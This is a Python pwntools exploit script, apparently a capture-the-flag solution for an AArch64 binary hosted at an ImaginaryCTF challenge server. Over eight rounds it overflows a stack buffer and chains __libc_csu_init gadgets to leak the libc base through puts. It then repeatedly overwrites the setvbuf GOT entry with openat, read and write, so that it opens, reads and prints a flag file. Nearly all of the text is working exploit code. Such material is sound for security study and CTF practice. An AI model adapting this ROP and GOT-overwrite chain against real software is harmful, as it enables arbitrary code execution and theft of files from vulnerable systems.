from pwn import *

exe = ELF('./vuln')
libc = ELF('./libc.so.6')

#io = process(['qemu-aarch64', '-L', './', 'vuln'])
#gdb.attach(io, api=True)
io = remote('generic-rop-challenge.chal.imaginaryctf.org', 42042)

#Gadgets
csu_gadget_1 = 0x400948
csu_gadget_2 = 0x400924

# 1st round: leak libc
io.recvuntil(b'below\n')
payload = b'i'*72 + p64(csu_gadget_1)
payload += p64(0) + p64(csu_gadget_2) # x29, x30
payload += p64(0) + p64(1) # x19, x20
payload += p64(exe.got['puts']) + p64(exe.got['puts']) # x21, x22
payload += p64(0) + p64(0) # x23, x24
# Return to main
payload += p64(0) + p64(exe.sym['main']) # x29, x30
payload += p64(0) + p64(0) # x19, x20
payload += p64(0) + p64(0) # x21, x22
payload += p64(0) + p64(0) # x23, x24
io.sendline(payload)
#io.interactive()
libc.address = u64(io.recvline(keepends=False).ljust(8, b'\0')) - libc.sym['puts']
log.info(f'1st round done!\nLibc base: {hex(libc.address)}')

# 2nd round: Overwrite setvbuf as openat
io.recvuntil(b'below\n')
payload = b'i'*72 + p64(csu_gadget_1)
payload += p64(0) + p64(csu_gadget_2) # x29, x30
payload += p64(0) + p64(1) # x19, x20
payload += p64(exe.got['gets']) + p64(exe.got['setvbuf']) # x21, x22
payload += p64(0) + p64(0) # x23, x24
# Return to main
payload += p64(0) + p64(exe.sym['main']) # x29, x30
payload += p64(0) + p64(0) # x19, x20
payload += p64(0) + p64(0) # x21, x22
payload += p64(0) + p64(0) # x23, x24
io.sendline(payload)
io.sendline(p64(libc.sym['openat']))
log.info(f'2nd round done!\nOpenat: {hex(libc.sym["openat"])}')

# 3rd round: Overwrite bss ./flag.txt?
io.recvuntil(b'below\n')
payload = b'i'*72 + p64(csu_gadget_1)
payload += p64(0) + p64(csu_gadget_2) # x29, x30
payload += p64(0) + p64(1) # x19, x20
payload += p64(exe.got['gets']) + p64(exe.bss(0x100)) # x21, x22
payload += p64(0) + p64(0) # x23, x24
# Return to main
payload += p64(0) + p64(exe.sym['main']) # x29, x30
payload += p64(0) + p64(0) # x19, x20
payload += p64(0) + p64(0) # x21, x22
payload += p64(0) + p64(0) # x23, x24
io.sendline(payload)
io.sendline(b'/home/user/flag.txt')
log.info(f'3rd round done!\n')

# 4th round: Use setvbuf to open flag
io.recvuntil(b'below\n')
payload = b'i'*72 + p64(csu_gadget_1)
payload += p64(0) + p64(csu_gadget_2) # x29, x30
payload += p64(0) + p64(1) # x19, x20
payload += p64(exe.got['setvbuf']) + p64(0) # x21, x22
payload += p64(exe.bss(0x100)) + p64(0) # x23, x24
# Return to main
payload += p64(0) + p64(exe.sym['main']) # x29, x30
payload += p64(0) + p64(0) # x19, x20
payload += p64(0) + p64(0) # x21, x22
payload += p64(0) + p64(0) # x23, x24
io.sendline(payload)
log.info(f'4th round done!\n')

# 5th round: Overwrite setvbuf as read?
io.recvuntil(b'below\n')
payload = b'i'*72 + p64(csu_gadget_1)
payload += p64(0) + p64(csu_gadget_2) # x29, x30
payload += p64(0) + p64(1) # x19, x20
payload += p64(exe.got['gets']) + p64(exe.got['setvbuf']) # x21, x22
payload += p64(0) + p64(0) # x23, x24
# Return to main
payload += p64(0) + p64(exe.sym['main']) # x29, x30
payload += p64(0) + p64(0) # x19, x20
payload += p64(0) + p64(0) # x21, x22
payload += p64(0) + p64(0) # x23, x24
io.sendline(payload)
io.sendline(p64(libc.sym['read']))
log.info(f'5th round done!\nRead: {hex(libc.sym["read"])}')

# 6th round: Use setvbuf to read flag
io.recvuntil(b'below\n')
payload = b'i'*72 + p64(csu_gadget_1)
payload += p64(0) + p64(csu_gadget_2) # x29, x30
payload += p64(0) + p64(1) # x19, x20
payload += p64(exe.got['setvbuf']) + p64(5) # x21, x22
payload += p64(exe.bss(0x100)) + p64(100) # x23, x24
# Return to main
payload += p64(0) + p64(exe.sym['main']) # x29, x30
payload += p64(0) + p64(0) # x19, x20
payload += p64(0) + p64(0) # x21, x22
payload += p64(0) + p64(0) # x23, x24
io.sendline(payload)
log.info(f'6th round done!\n')

# 7th round: Overwrite setvbuf as write?
io.recvuntil(b'below\n')
payload = b'i'*72 + p64(csu_gadget_1)
payload += p64(0) + p64(csu_gadget_2) # x29, x30
payload += p64(0) + p64(1) # x19, x20
payload += p64(exe.got['gets']) + p64(exe.got['setvbuf']) # x21, x22
payload += p64(0) + p64(0) # x23, x24
# Return to main
payload += p64(0) + p64(exe.sym['main']) # x29, x30
payload += p64(0) + p64(0) # x19, x20
payload += p64(0) + p64(0) # x21, x22
payload += p64(0) + p64(0) # x23, x24
io.sendline(payload)
io.sendline(p64(libc.sym['write']))
log.info(f'7th round done!\nWrite: {hex(libc.sym["write"])}')

# 8th round: Use setvbuf to write flag
io.recvuntil(b'below\n')
payload = b'i'*72 + p64(csu_gadget_1)
payload += p64(0) + p64(csu_gadget_2) # x29, x30
payload += p64(0) + p64(1) # x19, x20
payload += p64(exe.got['setvbuf']) + p64(1) # x21, x22
payload += p64(exe.bss(0x100)) + p64(100) # x23, x24
# Return to main
payload += p64(0) + p64(exe.sym['main']) # x29, x30
payload += p64(0) + p64(0) # x19, x20
payload += p64(0) + p64(0) # x21, x22
payload += p64(0) + p64(0) # x23, x24
io.sendline(payload)
log.info(f'8th round done!\n')

io.interactive()